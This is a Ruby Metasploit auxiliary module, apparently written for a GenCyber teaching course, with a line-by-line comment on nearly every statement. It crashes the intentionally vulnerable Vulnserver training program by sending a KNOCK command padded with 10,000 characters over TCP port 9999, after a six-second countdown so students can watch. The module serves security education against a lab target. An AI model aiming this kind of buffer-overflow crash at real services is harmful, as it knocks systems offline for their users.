class MetasploitModule < Msf::Auxiliary	      # This is a Auxillary module inheriting from the Auxillary class
  Rank = NormalRanking	                      # We set the ranking to Normal for simplicity. This is the potential success and impact to the target

  include Msf::Exploit::Remote::Tcp	          # Include this Mixin to gain TCP/IP functionality and Datastore Objects
  include Msf::Auxiliary::Dos                 # Include this Mixin to categorize this as a DoS Module, gain some DoS characteristics 

  def initialize(info = {})	                  # constructor, setting the values of the module
    super(update_info(info,                   # Calls parent class update_info function and updates values used by, and describing this module
      'Name'           => 'Vulnserver Buffer Overflow-KNOCK command', # Name of the module
      'Description'    => %q{
         Vulnserver is intentially written vulnerable. This expoits uses a simple buffer overflow.
      },                                      # Description of the module
      'Author'         => [ 'fxw', 'GenCyber-UML-2022'], # Author(s) name(s)
      'License'        => MSF_LICENSE,        # License this is distributed under
      'References'     =>	              
        [
          [ 'URL', 'https://github.com/xinwenfu/Malware-Analysis/edit/main/MetasploitNewModule' ]
        ],                                    # References for the vulnerability or exploit
      'Privileged'     => false,              # Extra privlages will not be gained, and are not needed to execute this module
      'DisclosureDate' => 'Mar. 30, 2022'))	  # When the vulnerability was disclosed in public
      register_options([
      	Opt::RPORT(9999)                      # Set default of Datastore object RPORT to 9999
      ])
  end

  def run	# Actual code the module will run, since this is a Auxiliary Module, this is a run function, type run to execute in the Metasploit console
        print_status("Connecting to target with IP #{datastore['RHOST']} and Port #{datastore['RPORT']}")
        connect #connect to target using values stored in datastore
        
        outbound = "KNOCK /.:/" + "A"*10000 # create outbound message, in this case A can be anything as we just want to crash the server 

        print_status("Sending Exploit in 6 seconds")

        for x in 0..5 do   # This was added so students have time to see the vChat server crash 
            print_status("#{6 - x}")
            sleep(1) #sleep for 1 second 6 times so that we will wait 6 seconds and count down
        end

        sock.put(outbound)
        print_status("Exploit Sent")
    ensure #ensure that exploit disconnects
        disconnect
        print_status("Exiting Run Function")
  end
end
